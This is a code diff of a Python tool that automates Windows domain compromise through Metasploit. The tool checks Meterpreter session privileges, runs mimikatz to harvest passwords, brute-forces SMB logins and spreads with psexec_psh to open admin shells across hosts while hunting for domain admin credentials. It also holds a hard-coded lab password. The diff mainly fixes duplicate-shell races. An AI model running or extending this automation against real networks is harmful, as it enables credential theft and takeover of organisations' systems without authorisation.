@@ -77,7 +77,6 @@ def debug_info(output, label, label_num):
 def kill_tasks():
     print()
     print_info('Killing tasks then exiting', None, None)
-    embed()
     del_unchecked_hosts_files()
     for task in asyncio.Task.all_tasks():
         task.cancel()
@@ -224,9 +223,6 @@ async def sess_first_check(client, sess_num, sess_data, domain_data):
 
         print_good('New session {} found'.format(str(sess_num)), 'Session', sess_num)
 
-        # Sleep 2 secs to give meterpeter chance to open
-        #await meterpreter_sleep(sess_num, 2)
-
         # Migrate out of the process
         # Not sure we want this as it'll migrate a domain user with local admin shell into SYSTEM
         #await run_priv_migrate(client, sess_num)
@@ -236,6 +232,9 @@ async def sess_first_check(client, sess_num, sess_data, domain_data):
             return
         shell_info = [ip_data] + shell_info
 
+        # Get shell privileges
+        admin_shell, local_admin = await check_privs(client, sess_num, sess_data)
+
         # Get domain info
         domain = get_domain(shell_info)
         sess_data[sess_num][b'domain'] = domain
@@ -243,9 +242,6 @@ async def sess_first_check(client, sess_num, sess_data, domain_data):
 
         # Update domain_data for domain admins and domain controllers
         await get_DCs_DAs(client, sess_num, sess_data, domain_data)
-
-        # Get shell privileges
-        admin_shell, local_admin = await check_privs(client, sess_num, sess_data)
 
         # Print the new shell's data
         print_shell_data(shell_info, admin_shell, local_admin, sess_num_str)
@@ -516,44 +512,54 @@ async def check_creds_against_DC(client, sess_num, creds, plaintext):
     pass
 ########### finish this eventually
 
-async def check_for_DA(creds):
+async def check_for_DA(lock, creds):
+    pass
 
-    da_creds = False
-
-    if '\\'in creds:
-        username_pw = creds.split('\\')[1]
-        username = username_pw.split(':')[0]
-        if len([da for da in domain_data['domain_admins'] if username in da]) > 0:
-            print_great('Potential domain admin found! '+creds, None, None)
-
-    # Got dom\user:pw
-    if creds in domain_data['domain_admins']:
-        print_great('Potential domain admin found! '+creds, None, None)
-        da_creds = True
-        plaintext = True
-
-    # Got a hash
-    elif creds.count(':') == 6 and creds.endswith(':::'):
-        hash_split = creds.split(':')
-        user = hash_split[0]
-        rid = hash_split[1]
-        lm = hash_split[2]
-        ntlm = hash_split[3]
-        for c in domain_data['domain_admins']:
-            da_user_pw = c.split('\\')[1]
-            da_user = da_user_pw.split(':')[0]
-            creds = da_user+':'+ntlm
-            if user.lower() == da_user.lower():
-                msg = 'Potential domain admin found! '+creds
-                print_good(msg, 'Session', sess_num)
-                da_creds = True
-                plaintext = False
-
-    if da_creds:
-        if len(domain_data['domain_controllers']) > 0:
-            creds_worked = await check_creds_against_DC(client, sess_num, creds, plaintext)
-            if creds_worked:
-                print_great('Confirmed domain admin! '+creds, 'Session', sess_num)
+#    da_creds = False
+#    dom_user = creds.split(':', 1)[0]
+#
+#    # Got a hash
+#    if creds.count(':') > 5 and creds.endswith(':::'):
+#        hash_split = creds.split(':')
+#        user = hash_split[0]
+#        rid = hash_split[1]
+#        lm = hash_split[2]
+#        ntlm = hash_split[3]
+#        with await lock:
+#            for c in domain_data['domain_admins']:
+#                da_user_pw = c.split('\\')[1]
+#                da_user = da_user_pw.split(':')[0]
+#                creds = da_user+':'+ntlm
+#                if user.lower() == da_user.lower():
+#                    msg = 'Potential domain admin found! '+creds
+#                    print_good(msg, 'Session', sess_num)
+#                    da_creds = True
+#                    plaintext = False
+#
+#    # plaintext
+#    else:
+#        username_pw = creds.split('\\')[1]
+#        username = username_pw.split(':')[0]
+#        with lock:
+#            DAs = [da for da in domain_data['domain_admin']]
+#
+#        # Got NTLM or plaintext DA creds
+#        if dom_user in DAs:
+#            print_great('Domain admin found! - '+dom_user, None, None)
+#            kill_tasks()
+#            sys.exit()
+#
+#        if username in DAs:
+#            print_great('Potential domain admin found! '+creds, None, None)
+#            print_info('Known domain admins:', None, None)
+#            for da in DAs:
+#                print('    '+da)
+#
+#    if da_creds:
+#        if len(domain_data['domain_controllers']) > 0:
+#            creds_worked = await check_creds_against_DC(client, sess_num, creds, plaintext)
+#            if creds_worked:
+#                print_great('Confirmed domain admin! '+creds, 'Session', sess_num)
 
 async def get_passwords(client, sess_num, sess_data, domain_data):
     await run_mimikatz(client, sess_num, sess_data, domain_data)
@@ -702,7 +708,6 @@ def parse_creds(creds, cred_type):
 
     return dom, user, pwd, rid
 
-
 async def spread(lock, client, c_ids, lhost, sess_data, domain_data):
 
     while True:
@@ -715,7 +720,6 @@ async def spread(lock, client, c_ids, lhost, sess_data, domain_data):
                 dom_data_copy['checked_creds'][c] = []
                 await run_smb_brute(lock, client, c_ids, lhost, c, sess_data, domain_data, dom_data_copy)
 
-        print('GETTING NEW SHELL')####
         await get_new_shells(lock, client, c_ids, lhost, sess_data, domain_data, dom_data_copy)
 
         await asyncio.sleep(1)
@@ -743,30 +747,63 @@ async def run_smb_brute(lock, client, c_ids, lhost, creds, sess_data, domain_dat
     cmd, output = await run_msf_module(client, c_id, mod, rhost_var, target_ips, lhost, extra_opts, start_cmd, end_strs)
     await parse_module_output(lock, c_id, cmd, output, domain_data)
 
-async def get_new_shells(lock, client, c_ids, lhost, sess_data, domain_data, dom_data_copy):
+async def get_admin_session_data(lock, sess_data, domain_data):
 
     # Get all session IPs and figure out if they're admin shells so we don't overlap our spread
-    session_ips = {}
+    admin_sess_data = {}
     with await lock:
         for sess_num in sess_data:
+            ip = sess_data[sess_num][b'tunnel_peer'].split(b':')[0]
+            utf8_ip = ip.decode('utf8')
             if b'admin_shell' not in sess_data[sess_num]:
                 continue
-            ip = sess_data[sess_num][b'tunnel_peer'].split(b':')[0]
+
+            # In case we have multiple shells on the same IP, we must collect
+            # all their admin_shell properties to check later if we have any
+            # admin shells on that IP
+            admin_sess_data[ip] = []
+
             admin_shell = sess_data[sess_num][b'admin_shell']
-            session_ips[ip] = admin_shell
+            admin_sess_data[ip].append(admin_shell)
+
+            # Remove IP from pending_shell_ips which exists so spread() doesn't
+            # spread to an IP that's waiting for psexec_psh to finish
+            if admin_shell == b'True':
+                if utf8_ip in domain_data['pending_shell_ips']:
+                    domain_data['pending_shell_ips'].remove(utf8_ip)
+
+    return admin_sess_data
+
+async def get_new_shells(lock, client, c_ids, lhost, sess_data, domain_data, dom_data_copy):
+
+    admin_session_data = await get_admin_session_data(lock, sess_data, domain_data)
+
+    c_id = await get_nonbusy_cid(client, c_ids)
 
     # run psexec_psh on all ips that we either don't have a shell on already or don't have an admin shell on
     # dom_data_copy['checked_creds']['LAB\\dan:P@ssw0rd'] = [list of ips we have admin for those creds]
     for creds in dom_data_copy['checked_creds']:
         for admin_ip in dom_data_copy['checked_creds'][creds]:
             bytes_admin_ip = admin_ip.encode()
-            if bytes_admin_ip in session_ips:
-                if session_ips[bytes_admin_ip] == b'False' or session_ips[bytes_admin_ip] == b'ERROR':
-                    await run_psexec_psh(lock, client, c_ids, creds, admin_ip, lhost, domain_data)
-            else:
-                await run_psexec_psh(lock, client, c_ids, creds, admin_ip, lhost, domain_data)
 
-async def run_psexec_psh(lock, client, c_ids, creds, ip, lhost, domain_data):
+            # Shells take a minute to open so we don't want to double up on shells while they open
+            if admin_ip not in domain_data['pending_shell_ips']:
+
+                # Check if the IP we have admin on already has a session
+                if bytes_admin_ip in admin_session_data:
+
+                    # If we have a shell on it but we're not admin, then continue get admin shell
+                    # admin_shell_vals = [b'True', b'False', b'True'] depending on how many shells we have on that IP
+                    # Making design decision here to not check if the session is broken or not because it's too easy
+                    # for that to lead to infinite loops of spreading with broken sess after broken sess
+                    admin_shell_vals = [x for x in admin_session_data[bytes_admin_ip]]
+                    if b'True' in admin_shell_vals:
+                        continue
+
+                # Either we don't have this IP in our session, or there's no admin session open on it
+                await run_psexec_psh(lock, client, c_id, creds, admin_ip, lhost, domain_data)
+
+async def run_psexec_psh(lock, client, c_id, creds, ip, lhost, domain_data):
     cred_type = plaintext_or_hash(creds)
     dom, user, pwd, rid = parse_creds(creds, cred_type)
 
@@ -784,20 +821,28 @@ async def run_psexec_psh(lock, client, c_ids, creds, ip, lhost, domain_data):
                   'set smbdomain {}'.format(user, pwd, dom))
     end_strs = [b'[*] Meterpreter session ']
 
-    c_id = await get_nonbusy_cid(client, c_ids)
+    domain_data['pending_shell_ips'].append(ip)
     print_info('Performing lateral movement with credentials [{}:{}] against host [{}]'.format(user, pwd, ip), 'Console', c_id)
     cmd, output = await run_msf_module(client, c_id, mod, rhost_var, ip, lhost, extra_opts, start_cmd, end_strs)
     await parse_module_output(lock, c_id, cmd, output, domain_data)
 
 async def parse_module_output(lock, c_id, cmd, output, domain_data):
-    if output:
-        if 'smb_login' in cmd:
-            await parse_smb_login(lock, c_id, output, domain_data)
-        elif 'psexec_psh' in cmd:
-            await parse_psexec_psh(c_id, output)
+    if 'smb_login' in cmd:
+        await parse_smb_login(lock, c_id, output, domain_data)
+    elif 'psexec_psh' in cmd:
+        await parse_psexec_psh(c_id, cmd, output, domain_data)
 
-async def parse_psexec_psh(c_id, output):
+async def parse_psexec_psh(c_id, cmd, output, domain_data):
     user = None
+
+    # If run_psexec_psh fails then remove the IP from pending_shell_ips
+    if not output:
+        for l in cmd.splitlines():
+            if 'RHOST' in l:
+                ip = l.split()[-1]
+                if ip in domain_data['pending_shell_ips']:
+                    domain_data['pending_shell_ips'].remove(ip)
+
     for l in output.splitlines():
         l = l.strip().decode('utf8')
         if 'smbuser =>' in l:
@@ -806,9 +851,6 @@ async def parse_psexec_psh(c_id, output):
             l_split = l.split()
             ip = l_split[7][:-1].split(':')[0]
             print_good('Successfully opened new shell with admin [{}] on [{}]'.format(user, ip), 'Console', c_id)
-
-            # Wait for it to completely open so we don't redo the same shell
-            await asyncio.sleep(5)
 
 async def create_user_pwd_creds(lock, user, pwd, dom, domain_data):
     '''Parse out the username and domain
@@ -839,7 +881,11 @@ async def parse_smb_login(lock, c_id, output, domain_data):
     creds = None
     admin_found = False
 
-    out_split = output.splitlines()
+    if output:
+        out_split = output.splitlines()
+    else:
+        return 
+
     for l in out_split:
         l = l.strip().decode('utf8')
 
@@ -954,7 +1000,7 @@ def get_output_errors(output, cmd):
                      b'failed to load extension',
                      b'requesterror',
                      b'is not a valid option for this module',
-                     b'exploit failed: rex::')
+                     b'exploit failed: rex::']
     err = None
 
     # Got an error from output
@@ -1078,7 +1124,7 @@ def is_session_broken(lock, sess_num, sess_data):
     if b'errors' in sess_data[sess_num]:
 
         # Session timed out on initial sysinfo cmd
-        if b'domain' not in sess_data[sess_num]:
+        if b'user' not in sess_data[sess_num]:
             return True
 
         # Session abruptly died
@@ -1105,12 +1151,12 @@ async def get_sessions(lock, client, domain_data, sess_data):
     print_waiting = True
     sleep_secs = 2
 
-    ## exists for potential debug purposes ##
+    ### exists for potential debug purposes ##
     counter = 0
-    if counter > 30:
-        # Yes this is public information but just here for debugging
-        domain_data['creds'].append('lab2\\dan.da:Qwerty1da')
-    #########################################
+    #if counter > 30:
+    #    # Yes this is public information but just here for debugging
+    #    domain_data['creds'].append('lab2\\dan.da:Qwerty1da')
+    ##########################################
 
     while True:
         # Get list of MSF sessions from RPC server
@@ -1198,7 +1244,6 @@ async def attack_with_session(lock, client, sess_num, sess_data, domain_data):
     if is_session_broken(lock, sess_num, sess_data) == False:
         await attack(client, sess_num, sess_data, domain_data)
 
-
 def main():
 
     lock = asyncio.Lock()
@@ -1208,6 +1253,7 @@ def main():
                    'domain_admins':[],
                    'domain_controllers':[],
                    'high_priority_ips':[],
+                   'pending_shell_ips':[],
                    'creds':[],
                    'checked_creds':{},
                    'hosts':[]}
@@ -1228,7 +1274,7 @@ def main():
     loop = asyncio.get_event_loop()
     loop.add_signal_handler(signal.SIGINT, kill_tasks)
 
-    fut_check_sessions = asyncio.ensure_future(get_sessions(lock,
+    fut_get_sessions = asyncio.ensure_future(get_sessions(lock,
                                                             client,
                                                             domain_data,
                                                             sess_data))
@@ -1243,7 +1289,7 @@ def main():
 
     try:
 #        loop.run_until_complete(fut_check_sessions, fut_attack, fut_spread)
-        loop.run_until_complete(asyncio.gather(fut_check_sessions, fut_spread))
+        loop.run_until_complete(asyncio.gather(fut_get_sessions, fut_spread))
     except asyncio.CancelledError:
         print_info('Tasks gracefully smited.', None, None)
     finally:
@@ -1257,8 +1303,3 @@ if __name__ == "__main__":
     main()
 
 ## Left off
-# 772
-# debugging why we get multi shells all the time
-# probably because spread is a future and attack_with_session is a future too
-# so domain_data is not being updated fast enough and we're looping into spread() over and over
-# before we're done adding ['admin_shell'] to sess_data
